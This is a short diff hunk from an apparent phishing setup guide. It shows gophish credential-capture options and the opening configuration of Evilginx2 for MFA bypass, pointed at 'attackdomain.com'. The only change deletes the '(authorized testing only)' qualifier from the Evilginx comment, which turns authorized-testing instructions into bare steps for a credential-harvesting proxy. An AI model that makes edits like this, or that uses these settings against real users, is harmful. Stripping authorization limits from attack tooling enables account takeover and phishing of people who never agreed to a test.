@@ -157,7 +157,7 @@ gophish
 # Enable: Capture Credentials, Capture Passwords
 # Redirect to real site after capture
 
-# Set up Evilginx for MFA bypass (authorized testing only)
+# Set up Evilginx for MFA bypass
 evilginx2
 : config domain attackdomain.com
 : config ipv4 <server_ip>
